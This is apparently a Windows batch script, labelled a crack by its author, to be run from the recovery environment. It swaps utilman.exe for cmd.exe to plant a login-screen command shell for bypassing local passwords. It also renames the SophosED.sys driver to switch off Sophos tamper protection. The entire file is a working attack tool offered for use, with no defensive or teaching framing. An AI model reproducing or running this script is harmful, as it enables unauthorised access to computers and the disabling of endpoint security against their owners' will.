@echo off
setlocal enabledelayedexpansion

rem Crack Script Made by S1rDyn0

if /i "%CD:~0,2%" NEQ "X:" (
  cls
  echo                __
  echo               / _^)
  echo      _.----._/ /
  echo     /         /
  echo  __/ ^(  ^| ^(  ^|
  echo /__.-'^|_^|--^|_^|
  echo EXPLOIT ERROR... & echo:
  echo You must be in the Installer/Recovery environment to run this script!
  pause
  cls
  exit /b 1
)

:menu
cls
echo ^|==============================^|
echo ^|  WINDOWS EXPLOIT BY S1rDyn0  ^|
echo ^|                              ^|
echo ^|  Version             23.5.1  ^|
echo ^|==============================^| & echo: & echo:
echo ^[1^] Local Password Exploit
echo ^[2^] Disable Sophos Tamper Protection
echo ^[3^] Password ^& Sophos Exploit
echo ^[4^] Show On-Screen Keyboard
echo ^[5^] Exit
echo: & echo: & echo:

set validOptions= 1 2 3 4 5
set /p crackType=^> 

set optionFound=false
for %%a in (%validOptions%) do (
  if %crackType%==%%a (
    set optionFound=true
  )
)

if not %optionFound%==true (
  echo Looks like that's an invalid option!
  ping 0.0.0.0 -n 5 > nul
  goto menu
)

if %crackType% EQU 5 (
  cls & echo Exiting...
  exit /b 1
)

if %crackType% EQU 1 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32" (
    echo System Directory Found
    cd "c:\windows\system32"
    echo Changed current working directory

    echo Renaming utilman.exe to utilman.old
    ren utilman.exe utilman.old || goto cmdFail

    echo Copying cmd.exe to utilman.exe
    copy cmd.exe utilman.exe || goto cmdFail

    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause

  ) else (
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    pause
    goto menu
  )
)

if %crackType% EQU 2 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32\drivers" (
    echo System Directory Found
    cd "c:\windows\system32\drivers"
    
    echo Renaming SophosED.sys to SophosED.sys.old
    ren SophosED.sys SophosED.sys.old || goto cmdFail

    echo -----------------------------------
    echo Exploit Completed ^| No errors
    pause

  ) else (
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    pause
    goto menu
  )
)

if %crackType% EQU 3 (
  cls
  echo Starting Hack
  if /i exist "c:\windows\system32" (
    echo System Directory Found
    cd "c:\windows\system32"
    echo Changed current working directory

    echo Renaming utilman.exe to utilman.old
    ren utilman.exe utilman.old || goto cmdFail

    echo Copying cmd.exe to utilman.exe
    copy cmd.exe utilman.exe || goto cmdFail

    if /i exist "c:\windows\system32\drivers" (
      echo System Directory Found
      cd "c:\windows\system32\drivers"
      
      echo Renaming SophosED.sys to SophosED.sys.old
      ren SophosED.sys SophosED.sys.old || goto cmdFail

      echo -----------------------------------
      echo Exploit Completed ^| No errors
      pause

    ) else (
      echo Could not find System Directory... & echo:
      echo Failing Exploit and returning to menu
      pause
      goto menu
    )

  ) else (
    echo Could not find System Directory... & echo:
    echo Failing Exploit and returning to menu
    pause
    goto menu
  )
)

if %crackType% EQU 4 (
  start "" "c:/windows/system32/osk.exe"
)

goto menu
:cmdFail
echo:
echo Failing Exploit and returning to menu
pause
goto menu
